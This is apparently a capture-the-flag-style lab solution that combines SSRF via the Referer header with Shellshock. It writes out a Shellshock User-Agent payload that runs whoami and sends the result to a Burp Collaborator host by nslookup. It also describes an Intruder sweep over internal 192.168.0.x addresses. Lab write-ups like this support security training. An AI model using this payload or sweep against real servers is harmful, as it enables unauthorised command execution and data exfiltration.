### Solution

After adding the lab domain to scope, it can be seen that the collaborator is triggered when the page is browsed.

Sent the user agent request to burp intruder

Added the payload `() { :; }; /usr/bin/nslookup $(whoami) .9s2yb2fmseaopv8fub0byl7h086zupie.oastify.com` in the intruder at the user agent section 

Where `9s2yb2fmseaopv8fub0byl7h086zupie.oastify.com` is the burp collaborator payload

Also changed the reference header to `http://192.168.0.1:8080` and added sniper attack at last octect. Set payload as numbers from 1 to 255

After successfully completing the attack, in the collaborator tab clicking on poll now option gives the result with os username.
